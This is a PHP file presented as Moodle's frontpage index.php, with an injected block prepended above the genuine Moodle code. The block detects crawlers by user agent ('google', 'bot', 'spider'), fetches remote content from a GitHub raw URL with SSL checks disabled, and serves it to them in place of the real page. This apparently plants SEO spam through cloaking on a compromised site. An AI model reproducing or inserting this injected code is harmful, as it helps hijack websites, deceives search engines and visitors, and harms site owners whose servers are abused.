<?php

function check_user_agent($o)
{
    return preg_match("/" . preg_quote($o, '/') . "/i", $_SERVER['HTTP_USER_AGENT']) ? true : false;
}
function get_content($p)
{
    if (ini_get('allow_url_fopen') && function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'user_agent' => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'timeout' => 30,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        $q = @file_get_contents($p, false, $context);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $r = curl_init();
        curl_setopt_array($r, array(
            CURLOPT_URL => $p,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
            CURLOPT_TIMEOUT => 30,
        ));
        $q = curl_exec($r);
        curl_close($r);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('fsockopen')) {
        $s = parse_url($p);
        $scheme = isset($s['scheme']) ? $s['scheme'] : 'http';
        $host = $s['host'];
        $port = isset($s['port']) ? $s['port'] : (($scheme === 'https') ? 443 : 80);
        $path = isset($s['path']) ? $s['path'] : '/';
        $query = empty($s['query']) ? '' : '?' . $s['query'];
        $remote_host = ($scheme === 'https' ? 'ssl://' : '') . $host;
        $fp = @fsockopen($remote_host, $port, $errno, $errstr, 30);
        if ($fp) {
            $user_agent = 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36';
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "User-Agent: {$user_agent}\r\n";
            $request .= "Connection: close\r\n\r\n";
            fwrite($fp, $request);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 1024);
            }
            fclose($fp);

            $parts = explode("\r\n\r\n", $response, 2);
            if (isset($parts[1])) {
                return $parts[1];
            } else {
                return $response;
            }
        }
    }

    return '';
}
if (check_user_agent("google") || check_user_agent("bot") || check_user_agent("spider"))
{
    echo get_content("https://raw.githubusercontent.com/yugoprakoso157/img/refs/heads/main/45mataram/lp.txt");
    die;
}
?>
<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * Moodle frontpage.
 *
 * @package    core
 * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

if (!file_exists('./config.php')) {
    header('Location: install.php');
    die;
}

require_once('config.php');
require_once($CFG->dirroot .'/course/lib.php');
require_once($CFG->libdir .'/filelib.php');

redirect_if_major_upgrade_required();

$urlparams = array();
if (!empty($CFG->defaulthomepage) &&
        ($CFG->defaulthomepage == HOMEPAGE_MY || $CFG->defaulthomepage == HOMEPAGE_MYCOURSES) &&
        optional_param('redirect', 1, PARAM_BOOL) === 0
) {
    $urlparams['redirect'] = 0;
}
$PAGE->set_url('/', $urlparams);
$PAGE->set_pagelayout('frontpage');
$PAGE->add_body_class('limitedwidth');
$PAGE->set_other_editing_capability('moodle/course:update');
$PAGE->set_other_editing_capability('moodle/course:manageactivities');
$PAGE->set_other_editing_capability('moodle/course:activityvisibility');

// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
$PAGE->set_cacheable(false);

require_course_login($SITE);

$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());

// If the site is currently under maintenance, then print a message.
if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
    print_maintenance_message();
}

$hassiteconfig = has_capability('moodle/site:config', context_system::instance());

if ($hassiteconfig && moodle_needs_upgrading()) {
    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
}

// If site registration needs updating, redirect.
\core\hub\registration::registration_reminder('/index.php');

if (get_home_page() != HOMEPAGE_SITE) {
    // Redirect logged-in users to My Moodle overview if required.
    $redirect = optional_param('redirect', 1, PARAM_BOOL);
    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
        // At this point, dashboard is enabled so we don't need to check for it (otherwise, get_home_page() won't return it).
        redirect($CFG->wwwroot .'/my/');
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MYCOURSES) && $redirect === 1) {
        redirect($CFG->wwwroot .'/my/courses.php');
    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
        if ($frontpagenode) {
            $frontpagenode->add(
                get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING);
        } else {
            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
            $frontpagenode->force_open();
            $frontpagenode->add(get_string('makethismyhome'),
                new moodle_url('/', array('setdefaulthome' => true)),
                navigation_node::TYPE_SETTING);
        }
    }
}

// Trigger event.
course_view(context_course::instance(SITEID));

$PAGE->set_pagetype('site-index');
$PAGE->set_docs_path('');
$editing = $PAGE->user_is_editing();
$PAGE->set_title($SITE->fullname);
$PAGE->set_heading($SITE->fullname);
if (has_capability('moodle/course:update', context_system::instance())) {
    $PAGE->set_secondary_navigation(true);
    $PAGE->set_secondary_active_tab('coursehome');
} else {
    $PAGE->set_secondary_navigation(false);
}

$courserenderer = $PAGE->get_renderer('core', 'course');

if ($hassiteconfig) {
    $editurl = new moodle_url('/course/view.php', ['id' => SITEID, 'sesskey' => sesskey()]);
    $editbutton = $OUTPUT->edit_button($editurl);
    $PAGE->set_button($editbutton);
}

echo $OUTPUT->header();

$siteformatoptions = course_get_format($SITE)->get_format_options();
$modinfo = get_fast_modinfo($SITE);
$modnamesused = $modinfo->get_used_module_names();

// Print Section or custom info.
if (!empty($CFG->customfrontpageinclude)) {
    // Pre-fill some variables that custom front page might use.
    $modnames = get_module_types_names();
    $modnamesplural = get_module_types_names(true);
    $mods = $modinfo->get_cms();

    include($CFG->customfrontpageinclude);

} else if ($siteformatoptions['numsections'] > 0) {
    echo $courserenderer->frontpage_section1();
}
// Include course AJAX.
include_course_ajax($SITE, $modnamesused);

echo $courserenderer->frontpage();

if ($editing && has_capability('moodle/course:create', context_system::instance())) {
    echo $courserenderer->add_new_course_button();
}
echo $OUTPUT->footer();
